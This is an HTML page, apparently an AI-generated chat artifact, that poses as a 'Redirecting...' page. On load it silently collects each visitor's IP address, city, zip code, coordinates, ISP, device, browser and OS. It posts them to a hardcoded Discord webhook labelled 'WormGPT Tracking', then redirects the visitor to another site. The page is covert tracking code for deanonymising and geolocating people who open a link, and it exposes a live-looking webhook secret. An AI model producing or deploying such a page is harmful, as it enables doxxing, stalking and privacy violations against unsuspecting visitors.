<xaiArtifact artifact_id="5ca7693c-ee28-40b8-82e5-178f056f6d60" artifact_version_id="97e8abd1-7802-4f79-90b4-17aebd7714dc" title="index.html" contentType="text/html">
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Redirecting...</title>
    <script type="text/javascript">
      // Function to get IP and detailed info, then send to Discord webhook
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          // Fetch detailed IP info from ip-api.com
          fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,mobile,proxy,hosting,query`)
            .then(response => response.json())
            .then(ipData => {
              const webhookUrl = 'https://discord.com/api/webhooks/1368256023323873361/gaOniOEwf1VxcMFjqZi4umFRLRApTjyd7phFHoCxnIHlDuCRGSwxzVw83zurUHEA6Tyc';
              // Get device info from user agent
              const userAgent = navigator.userAgent;
              let deviceInfo = 'Unknown';
              if (/mobile/i.test(userAgent)) {
                deviceInfo = 'Mobile';} else if (/tablet/i.test(userAgent)) {
                deviceInfo = 'Tablet';} else {
                deviceInfo = 'Desktop';}              // Browser and OS detection
              let browser = 'Unknown';
              let os = 'Unknown';
              if (userAgent.includes('Chrome')) browser = 'Chrome';
              else if (userAgent.includes('Firefox')) browser = 'Firefox';
              else if (userAgent.includes('Safari')) browser = 'Safari';
              if (userAgent.includes('Windows')) os = 'Windows';
              else if (userAgent.includes('Mac OS')) os = 'Mac OS';
              else if (userAgent.includes('Android')) os = 'Android';
              else if (userAgent.includes('iOS')) os = 'iOS';
              // Create Discord embed
              const embed = {
                embeds: [{
                  title: 'New Website Visitor',
                  color: 0xFF0000,
                  fields: [
                    { name: 'IP Address', value: ipData.query || 'Unknown', inline: true},                    { name: 'Country', value: ipData.country || 'Unknown', inline: true},                    { name: 'Region', value: ipData.regionName || 'Unknown', inline: true},                    { name: 'City', value: ipData.city || 'Unknown', inline: true},                    { name: 'Zip Code', value: ipData.zip || 'Unknown', inline: true},                    { name: 'Coordinates', value: `${ipData.lat || 'Unknown'},${ipData.lon || 'Unknown'}`, inline: true},                    { name: 'ISP', value: ipData.isp || 'Unknown', inline: false},                    { name: 'Organization', value: ipData.org || 'Unknown', inline: false},                    { name: 'Device Type', value: deviceInfo, inline: true},                    { name: 'Browser', value: browser, inline: true},                    { name: 'Operating System', value: os, inline: true},                    { name: 'Mobile', value: ipData.mobile? 'Yes' : 'No', inline: true},                    { name: 'Proxy/VPN', value: ipData.proxy? 'Yes' : 'No', inline: true},                    { name: 'Hosting', value: ipData.hosting? 'Yes' : 'No', inline: true}                  ],
                  timestamp: new Date().toISOString(),
                  footer: { text: 'WormGPT Tracking'}                }]
              };
              // Send embed to Discord webhook
              fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json'},                body: JSON.stringify(embed)
              })
              .finally(() => {
                // Redirect to the website after sending the webhook
                window.location.replace('https://fakecrime.bio/dxg');
              });
            })
            .catch(() => {
              // Fallback: send basic IP info if detailed fetch fails
              const webhookUrl = 'https://discord.com/api/webhooks/1368256023323873361/gaOniOEwf1VxcMFjqZi4umFRLRApTjyd7phFHoCxnIHlDuCRGSwxzVw83zurUHEA6Tyc';
              const message = { content:`Someone entered your website from this IP address:${ip}` };
              fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json'},                body: JSON.stringify(message)
              })
              .finally(() => {
                window.location.replace('https://fakecrime.bio/dxg');
              });
            });
        })
        .catch(() => {
          // In case of any error, still redirect
          window.location.replace('https://fakecrime.bio/dxg');
        });
    </script>
  </head>
  <body>
  </body>
</html>
</xaiArtifact>
